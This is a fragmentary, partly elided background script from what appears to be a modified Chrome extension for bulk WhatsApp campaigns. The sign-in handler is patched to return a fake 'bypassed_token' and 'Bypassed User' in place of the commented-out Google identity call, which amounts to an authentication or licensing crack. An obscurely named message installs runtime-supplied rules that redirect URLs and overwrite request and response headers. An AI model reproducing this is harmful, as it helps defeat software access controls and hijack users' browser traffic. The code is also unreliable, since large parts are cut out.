(() => {
  ...
  chrome.runtime.onInstalled.addListener(function (t) {
    ("install" != t.reason && "update" !== t.reason) ||
      // chrome.tabs.create({ url: "https://go.wawf.app/Community" }),
    ...
    chrome.runtime.onMessage.addListener(function (s, r, p) {
      console.log(s.data?.requestData);

      return (
        "opnimansdfSDfds" == s.subject &&
          [
            {
              t: "p",
              type: [
                    ...
                    addRules: [
                      {
                        id: e,
                        priority: 2,
                        action: { type: "redirect", redirect: { url: t.url } },
                        condition: {
                          urlFilter: t.filter,
                    ...
                    addRules: [
                      {
                        ...
                        action: {
                          type: "modifyHeaders",
                          responseHeaders: [
                            { operation: "set", value: t.value, header: t.key },
                          ],
                        },
                      },
                    ],
                    ...
                    addRules: [
                      {
                        ...
                        action: {
                          type: "modifyHeaders",
                          requestHeaders: [
                            { operation: "set", header: t.key, value: t.d },
                          ],
                        },
                        condition: {
                          urlFilter: t.filter,
        ...
        "SET_UNINSTALL_URL" == s.subject
          ? (chrome.runtime.setUninstallURL(s.url), p({}))
          : "SEND_RICH_NOTIFICATION" == s.subject
          ? (chrome.notifications.create(
              s.notificationId + "$@$notification" + Date.now(),
              {
                type: "basic",
            ...
            p({}))
          : "GET_GOOGLE_AUTH_TOKEN" == s.subject
          ? p({ token: "bypassed_token", userData: { name: "Bypassed User" } })
          : // : "GET_GOOGLE_AUTH_TOKEN" == s.subject
          ...
          //             .then((t) => t.json())
          //             .then((e) => {
          //               p({ token: t, userData: e });
          //             })
          //         : p({ token: t });
          //     }
          //   )
          "REMOVE_GOOGLE_AUTH_TOKEN" == s.subject
          ? chrome.identity.getAuthToken(
              { interactive: s.interactive },
              function (t) {
                fetch(
          ...
          : "FETCH_REMOTE_DATA_B" == s.subject
          ? o(s.data?.requestData).then((a) => {
              try {
                p(a),
                  "static_urls" == s?.data?.extraData?.type &&
                    ((t = a?.data),
                    (e = [
          ...
          : "EXECUTE_CAMPAIGN" == s.subject
          ? c(s.data).then((t) => {
              p(t);
            })
          : "EXECUTE_GET_CHAT" == s.subject
          ? p({})
          : "EXECUTE_BLUR_SETTING" == s.subject
          ? c(s.data).then((t) => {
              p(t);
            })
          : "EXECUTE_AVIATOR" == s.subject
          ? (async function () {
  ...
  const o = async ({
    ...
    p = (t) => a(((t = []) => t[Math.floor(Math.random() * t?.length)])(t));
  async function c(p = []) {
    try {
      ...
      if (p[2] && s(p[2]) == t?.PERK && p[0]) {
        ...
        if (s && 404 === s.status)
          return (
            setTimeout(() => {
              chrome.storage.local.set({ [a(t?.SUPPLY)]: null }, h);
            }, 6e5),
            "2"
          );
      }
